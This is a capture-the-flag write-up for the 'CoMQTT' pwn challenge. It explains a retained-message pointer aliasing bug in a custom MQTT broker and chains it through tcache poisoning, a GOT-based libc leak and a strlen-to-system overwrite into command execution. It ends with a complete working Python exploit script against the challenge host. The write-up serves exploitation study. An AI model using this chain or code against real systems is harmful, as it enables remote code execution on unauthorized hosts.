# pwn/CoMQTT

## Overview

This challenge ships a custom MQTT broker in `extracted/deploy/mqtt`, a deployment Dockerfile in `extracted/Dockerfile`, and the xinetd service config in `extracted/xinetd.d/mqtt_server`.

The first important discovery is that the public port `33686` is not the MQTT broker itself. The xinetd config shows:

- `server = /home/ctf/mqtt`
- `server_args = server`
- `port = 33686`

So the challenge gives you a console of the MQTT server on `33686`, and a random broker port that the MQTT clients must use is printed to that console. The solve must keep the admin connection open and also connect to the printed broker port.

From the binary itself, the key fixed addresses are easy to extract:

- `nm -n extracted/deploy/mqtt | rg 'b_retained|strlen|printf|puts'`
  - `b_retained = 0x449f40`
- `readelf -r extracted/deploy/mqtt | rg 'strlen|printf'`
  - `strlen@GOT = 0x409050`
  - `printf@GOT = 0x409060`
- `readelf -h extracted/deploy/mqtt`
  - the file type is `EXEC`, so it is not PIE

The local image in `extracted/Dockerfile` is Ubuntu 24.04, so its libc offsets can be reproduced from the same image:

- `printf@@GLIBC_2.2.5 = 0x600f0`
- `system@@GLIBC_2.2.5 = 0x58740`
- `strlen@@GLIBC_2.2.5 = 0xb4cb0`
- `puts@@GLIBC_2.2.5 = 0x87bd0`

That gives us everything needed for a libc leak plus a GOT overwrite.

## Exploit Chain

1. Discover the real target layout.

   `extracted/xinetd.d/mqtt_server` shows that `33686` launches the binary in `server` mode. The banner printed by that mode includes:

   - `Broker port : <random_port>`
   - admin commands such as `help`, `retained`, and `publish`

   So the solve must:

   - connect to `33686`
   - parse the printed broker port
   - keep the admin socket alive
   - open multiple MQTT client sockets to that broker port

2. Find the retained-message bug.

   The broker supports retained publishes. Sending an empty retained payload deletes the retained message for that topic. By exercising the feature in a fresh broker instance with topics `a`, `b`, `c`, then deleting and re-adding entries, the retained bookkeeping can be shown to alias payload pointers incorrectly.

   The useful sequence is:

   1. Retain `a`, `b`, `c`
   2. Delete `b`
   3. Add `d`
   4. Delete `a`
   5. Add `e`

   After reversing the retained handling and testing it dynamically, the active retained entries for `d`, `c`, and `e` end up sharing the same payload chunk. This happens because the delete path compacts or moves retained entries incorrectly and reuses metadata without fixing ownership of the payload pointer. This is the core memory corruption primitive.

3. Turn the alias into a heap primitive.

   Three MQTT connections are used in parallel:

   - client `A` builds the aliasing retained entries
   - client `B` performs the size-changing reallocations and subscribes to retained topics
   - client `C` writes the poisoned payload that corrupts allocator metadata

   The two chunk sizes used in the solve are:

   - `S = 0x10`
   - `T = 0x30`

   After the triple alias is created:

   - update retained topic `c` to size `T`
   - subscribe to retained topic `d`
   - the retained publish returned for `d` now exposes stale freed-chunk contents

   The first 8 bytes of that stale data are enough to recover the safe-linking value used by glibc tcache for that freed chunk. In the solve script this value is called `leak`.

   With that value, the script can build the encoded forward pointer needed for tcache poisoning:

   - `encoded = target ^ leak`

   Then:

   1. publish the poisoned forward pointer through alias `d`
   2. force one allocation through alias `e`
   3. publish the poison again through alias `d`
   4. allocate through alias `c`

   The final allocation returns a chunk whose address is attacker-controlled, so the payload for `c` becomes an arbitrary 16-byte write to `target`.

4. Use the arbitrary write for a clean libc leak.

   A direct format-string approach was possible but unstable. The clean version is to use the arbitrary write to corrupt one retained entry so that its payload pointer and length point somewhere useful.

   Reversing the retained entry structure shows:

   - retained array base: `b_retained = 0x449f40`
   - each entry size: `0x110`
   - payload pointer field: entry base `+ 0x100`
   - payload length field: entry base `+ 0x108`

   On a fresh broker instance, the first exploit prefix is stable enough that topic `s1_d` maps to retained entry 0 for this setup. That means:

   - entry 0 payload pointer field: `0x44a040`
   - entry 0 payload length field: `0x44a048`

   So the first arbitrary write targets `0x44a040` and writes:

   - qword 1 = `printf@GOT = 0x409060`
   - qword 2 = `8`

   After that, a normal MQTT client subscribes to retained topic `s1_d`. The broker believes that retained topic `s1_d` has an 8-byte payload stored at `printf@GOT`, so it sends back the resolved libc address of `printf`.

   Once `printf` is leaked, libc base is:

   - `libc_base = printf_addr - 0x600f0`

   And then:

   - `system = libc_base + 0x58740`

5. Overwrite `strlen@GOT` with `system`.

   The binary imports `strlen`, and `readelf -r extracted/deploy/mqtt` gives:

   - `strlen@GOT = 0x409050`

   That address is 16-byte aligned, which matches the arbitrary write primitive perfectly. So the second arbitrary write simply places `system` over:

   - `0x409050`
   - `0x409058`

   In the solve, both qwords are written with the same `system` address to avoid caring which adjacent call site gets touched.

6. Trigger command execution from the admin console.

   The admin console supports:

   - `publish <topic> <msg>`

   Internally, that code path uses `strlen(msg)`. After the GOT overwrite, `strlen(msg)` becomes `system(msg)`.

   So sending:

   - `publish test cat /home/ctf/flag`

   causes the process to run:

   - `system("cat /home/ctf/flag")`

   The command output is written back to the admin console, which is how the real flag is recovered.

## Final Solve

```python
import os
import re
import socket
import struct
import time


HOST = os.environ.get("HOST", "3.38.189.48")
ADMIN_PORT = int(os.environ.get("ADMIN_PORT", "33686"))
ATTEMPTS = int(os.environ.get("ATTEMPTS", "20"))

STRLEN_GOT = 0x409050
PRINTF_GOT = 0x409060
PRINTF_OFF = 0x600F0
SYSTEM_OFF = 0x58740
RETAINED0_FIELDS = 0x44A040

S = 0x10
T = 0x30

LIVE_SOCKETS: list[socket.socket] = []


def enc_varint(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n:
            b |= 0x80
        out.append(b)
        if not n:
            return bytes(out)


def read_varint(sock: socket.socket) -> int:
    mul = 1
    val = 0
    while True:
        c = sock.recv(1)
        if not c:
            raise EOFError("varint read failed")
        b = c[0]
        val += (b & 0x7F) * mul
        if not (b & 0x80):
            return val
        mul *= 128


def recv_pkt(sock: socket.socket) -> tuple[int, bytes]:
    hdr = sock.recv(1)
    if not hdr:
        raise EOFError("packet read failed")
    typ = hdr[0]
    rem = read_varint(sock)
    data = bytearray()
    while len(data) < rem:
        chunk = sock.recv(rem - len(data))
        if not chunk:
            raise EOFError("short packet read")
        data += chunk
    return typ, bytes(data)


def connect_pkt(cid: str) -> bytes:
    cid_b = cid.encode()
    vh = b"\x00\x04MQTT\x04\x02\x00\x3c"
    pl = struct.pack(">H", len(cid_b)) + cid_b
    return b"\x10" + enc_varint(len(vh) + len(pl)) + vh + pl


def publish_pkt(topic: str, payload: bytes, retain: bool = True) -> bytes:
    topic_b = topic.encode()
    body = struct.pack(">H", len(topic_b)) + topic_b + payload
    return bytes([0x30 | (1 if retain else 0)]) + enc_varint(len(body)) + body


def subscribe_pkt(pid: int, topic: str) -> bytes:
    topic_b = topic.encode()
    body = struct.pack(">H", pid) + struct.pack(">H", len(topic_b)) + topic_b + b"\x00"
    return b"\x82" + enc_varint(len(body)) + body


def close_quietly(sock: socket.socket | None) -> None:
    if sock is None:
        return
    try:
        sock.close()
    except OSError:
        pass


def close_live_sockets() -> None:
    while LIVE_SOCKETS:
        close_quietly(LIVE_SOCKETS.pop())


def parse_publish(data: bytes) -> tuple[str, bytes]:
    tlen = struct.unpack(">H", data[:2])[0]
    topic = data[2 : 2 + tlen].decode(errors="replace")
    payload = data[2 + tlen :]
    return topic, payload


def mqtt_conn(host: str, port: int, name: str) -> socket.socket:
    s = socket.create_connection((host, port), timeout=3.0)
    s.settimeout(1.0)
    s.sendall(connect_pkt(name))
    typ, data = recv_pkt(s)
    if typ != 0x20 or data != b"\x00\x00":
        raise RuntimeError(f"bad CONNACK: {typ:#x} {data!r}")
    return s


def mqtt_pub(sock: socket.socket, topic: str, payload: bytes) -> None:
    sock.sendall(publish_pkt(topic, payload, True))
    time.sleep(0.05)


class Admin:
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port), timeout=3.0)
        self.sock.settimeout(0.2)
        self.buf = ""

    def close(self) -> None:
        close_quietly(self.sock)

    def _recv_some(self, deadline: float) -> str:
        out = []
        while time.time() < deadline:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                break
            text = chunk.decode(errors="replace")
            self.buf += text
            out.append(text)
        return "".join(out)

    def drain(self, delay: float = 0.4) -> str:
        return self._recv_some(time.time() + delay)

    def read_banner(self) -> tuple[int, str]:
        data = self._recv_some(time.time() + 2.0)
        m = re.search(r"Broker port : (\d+)", self.buf)
        if not m:
            raise RuntimeError(f"failed to parse broker port from: {data!r}")
        return int(m.group(1)), self.buf

    def cmd(self, line: str, delay: float = 0.8) -> str:
        self.sock.sendall(line.encode() + b"\n")
        time.sleep(0.05)
        return self.drain(delay)


def leak_tcache_key(
    host: str, port: int, prefix: str
) -> tuple[int, tuple[socket.socket, socket.socket, socket.socket], tuple[str, str, str]]:
    a = mqtt_conn(host, port, prefix + "A")
    b = mqtt_conn(host, port, prefix + "B")
    c = mqtt_conn(host, port, prefix + "C")

    ta = prefix + "a"
    tb = prefix + "b"
    tc = prefix + "c"
    td = prefix + "d"
    te = prefix + "e"

    try:
        for topic, payload in (
            (ta, b"A" * S),
            (tb, b"B" * S),
            (tc, b"C" * S),
        ):
            mqtt_pub(a, topic, payload)
        mqtt_pub(a, tb, b"")
        mqtt_pub(a, td, b"D" * S)
        mqtt_pub(a, ta, b"")
        mqtt_pub(a, te, b"E" * S)

        mqtt_pub(b, tc, b"X" * T)
        b.sendall(subscribe_pkt(1, td))

        deadline = time.time() + 2.0
        while time.time() < deadline:
            try:
                typ, data = recv_pkt(b)
            except socket.timeout:
                continue
            if (typ >> 4) != 3:
                continue
            topic, payload = parse_publish(data)
            if topic == td and len(payload) >= 8:
                leak = struct.unpack("<Q", payload[:8])[0]
                return leak, (a, b, c), (tc, td, te)
        raise RuntimeError("failed to receive retained leak")
    except Exception:
        close_quietly(a)
        close_quietly(b)
        close_quietly(c)
        raise


def arb_write(host: str, port: int, prefix: str, target: int, qword1: int, qword2: int) -> None:
    if target & 0xF:
        raise ValueError(f"unaligned target: {target:#x}")

    leak, socks, topics = leak_tcache_key(host, port, prefix)
    a, b, c = socks
    tc, td, te = topics

    encoded = target ^ leak
    poison = struct.pack("<QQ", encoded, 0x4343434344444444)

    mqtt_pub(c, td, poison)
    mqtt_pub(b, te, b"Y" * T)
    mqtt_pub(c, td, poison)
    mqtt_pub(b, tc, struct.pack("<QQ", qword1, qword2))
    LIVE_SOCKETS.extend((a, b, c))


def subscribe_retained(host: str, port: int, cid: str, topic: str) -> bytes:
    s = mqtt_conn(host, port, cid)
    try:
        s.sendall(subscribe_pkt(1, topic))
        deadline = time.time() + 2.0
        while time.time() < deadline:
            try:
                typ, data = recv_pkt(s)
            except socket.timeout:
                continue
            if (typ >> 4) != 3:
                continue
            got_topic, payload = parse_publish(data)
            if got_topic == topic:
                return payload
        raise RuntimeError(f"no retained publish for {topic!r}")
    finally:
        close_quietly(s)


def leak_printf_addr(host: str, port: int, prefix: str) -> int:
    arb_write(host, port, prefix, RETAINED0_FIELDS, PRINTF_GOT, 8)
    time.sleep(0.05)
    payload = subscribe_retained(host, port, prefix + "SUB", prefix + "d")
    if len(payload) < 8:
        raise RuntimeError(f"short GOT leak: {payload!r}")
    return struct.unpack("<Q", payload[:8])[0]


def parse_flag(text: str) -> str:
    m = re.search(r"[A-Za-z0-9_]+\{[^}\r\n]+\}", text)
    if m:
        return m.group(0)
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("["):
            continue
        if line.startswith("publish "):
            continue
        return line
    raise RuntimeError(f"no flag-like line found in: {text!r}")


def run_once() -> str:
    admin = Admin(HOST, ADMIN_PORT)
    try:
        broker_port, banner = admin.read_banner()
        print(banner, end="", flush=True)

        printf_addr = leak_printf_addr(HOST, broker_port, "s1_")
        libc_base = printf_addr - PRINTF_OFF
        system = libc_base + SYSTEM_OFF

        print(f"[+] printf@libc = {printf_addr:#x}", flush=True)
        print(f"[+] system@libc = {system:#x}", flush=True)

        arb_write(HOST, broker_port, "s2_", STRLEN_GOT, system, system)
        time.sleep(0.35)
        flag_text = admin.cmd("publish test cat /home/ctf/flag", delay=2.5)
        flag_text += admin.drain(1.5)
        print(flag_text, end="", flush=True)
        return parse_flag(flag_text)
    finally:
        admin.close()


def main() -> None:
    last_err: Exception | None = None
    for attempt in range(1, ATTEMPTS + 1):
        close_live_sockets()
        try:
            print(f"[*] attempt {attempt}/{ATTEMPTS}", flush=True)
            flag = run_once()
            print(flag)
            return
        except Exception as exc:
            last_err = exc
            print(f"[!] attempt {attempt} failed: {exc}", flush=True)
            time.sleep(0.2)
        finally:
            close_live_sockets()
    raise SystemExit(f"exhausted attempts: {last_err}")


if __name__ == "__main__":
    main()
```

Run it like this:

```bash
python3 solve.py
```
